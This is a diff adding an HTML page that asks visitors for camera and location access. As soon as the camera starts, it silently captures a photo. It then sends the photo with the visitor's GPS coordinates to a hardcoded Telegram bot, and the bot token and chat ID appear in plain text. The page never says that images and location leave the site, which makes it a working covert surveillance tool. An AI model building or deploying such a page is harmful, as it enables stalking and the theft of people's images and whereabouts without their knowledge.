@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Access Your Camera and Location</h1>
+    <video id="video" width="300" height="300" autoplay></video>
+    <canvas id="canvas" width="300" height="300" style="display:none;"></canvas>
+
+    <script>
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const context = canvas.getContext("2d");
+
+      let latitude = null;
+      let longitude = null;
+
+      // Function to capture an image and send it along with location to Telegram
+      function captureAndSendPhoto() {
+        // Draw the video frame to the canvas
+        context.drawImage(video, 0, 0, 300, 300);
+        const imageData = canvas.toDataURL("image/png");
+
+        // Prepare to send image and location to Telegram
+        const botToken = "7989328039:AAHjtWCxi5HsiOVMr8m2neT-dOS-z6qeOac";
+        const chatId = "1234043131";
+        const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+        // Convert base64 image to Blob
+        fetch(imageData)
+          .then((res) => {
+            if (!res.ok) throw new Error("Failed to convert image to Blob.");
+            return res.blob();
+          })
+          .then((blob) => {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "photo.png");
+
+            // Add location data if available
+            if (latitude && longitude) {
+              formData.append("caption", `Location: Lat ${latitude}, Long ${longitude}`);
+            }
+
+            // Send the image and location to Telegram
+            return fetch(url, {
+              method: "POST",
+              body: formData,
+            });
+          })
+          .then((response) => {
+            if (!response.ok) throw new Error("Failed to send the image to Telegram.");
+            return response.json();
+          })
+          .then((data) => console.log("Photo and location sent to Telegram:", data))
+          .catch((error) => {
+            console.error("Error:", error.message);
+            alert("An error occurred: " + error.message);
+          });
+      }
+
+      // Access the camera
+      navigator.mediaDevices
+        .getUserMedia({ video: true })
+        .then((stream) => {
+          video.srcObject = stream;
+
+          // Once the camera stream is ready, capture a photo
+          video.addEventListener("loadedmetadata", () => {
+            captureAndSendPhoto();
+          });
+        })
+        .catch((err) => {
+          console.error("Error accessing the camera: " + err.message);
+          alert("Could not access the camera. Please check camera permissions.");
+        });
+
+      // Access location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            latitude = position.coords.latitude;
+            longitude = position.coords.longitude;
+            console.log(`Location: Lat ${latitude}, Long ${longitude}`);
+          },
+          (error) => {
+            console.error("Error getting location: " + error.message);
+            alert("Could not access location. Please enable location permissions.");
+          }
+        );
+      } else {
+        console.log("Geolocation is not supported by this browser.");
+      }
+    </script>
+  </body>
+</html>
